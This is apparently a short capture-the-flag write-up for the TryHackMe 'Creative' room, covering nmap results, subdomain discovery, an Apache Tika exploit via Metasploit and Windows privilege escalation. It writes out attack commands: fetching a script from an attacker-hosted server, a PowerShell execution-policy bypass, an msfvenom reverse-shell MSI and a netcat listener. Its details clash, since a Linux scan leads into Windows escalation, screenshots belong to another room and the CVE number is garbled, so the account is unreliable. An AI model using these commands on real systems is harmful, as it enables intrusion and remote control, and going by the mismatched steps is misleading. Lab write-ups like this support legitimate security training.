---
title: THM Creative
author: hanhctf
date: 2024-05-21 12:00:00 +0700
categories: [Write-up, THM]
tags: []
toc: true
mermaid: true
---

# [**Creative**](https://tryhackme.com/r/room/creative)

# Summary
>
> - beta subdomain
> - Use metasploit exploit user
> - Use PrivescCheck.ps1, check Windows Privilege Escalation  
> - AlwaysInstallElevated vuln

## NMAP

```text
Nmap scan report for creative.thm (10.10.204.200)
Host is up (0.40s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

The Nmap scan reveals only two ports: port 22, on which we have SSH, and port 80, a web server with nginx 1.18.0.

Nothing interesting on the web server.

Time to enumerate some subdomains `creative.thm`.

We find the subdomain `beta.creative.thm`.

![](/commons/THM/Creative/0_subdomain.png)

Quick search, we found CVE-201801335 for Apache Tika 1.17 Server on [exploit-db](https://www.exploit-db.com/exploits/47208)

## Foothold

Use Metasploit to exploit this vuln.
![](/commons/THM/CyberLens/1_metasploit_exploit.png)

Worked.

***GOT USER.TXT FLAG***

## Privilege Escalation

This tool can find in Github [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).

We can use curl to upload PrivescCheck.ps1 to victim via powershell.
In this case. I run local server with `python3 -m http.server 80` to host PrivescCheck.ps1 file.
In victim machine, we get .ps1 via `Invoke-WebRequest -Uri http://attack_IP:port/PrivescCheck.ps1 -Outfile PrivescCheck.ps1`

Run tools:

```shell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

We found a vuln that can be exploit.

![](/commons/THM/CyberLens/2_Always_Install_Elevated.png)

And we can use [this exploit](https://juggernaut-sec.com/alwaysinstallelevated/)

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
```

And upload from local.
In another terminal, listen on port 443 `sudo nc -nlvp 443`

After get evil.msi in victim from local.
Just run file. And we got system.
![](/commons/THM/CyberLens/3_Root.png)

***GOT ADMIN.TXT FLAG***
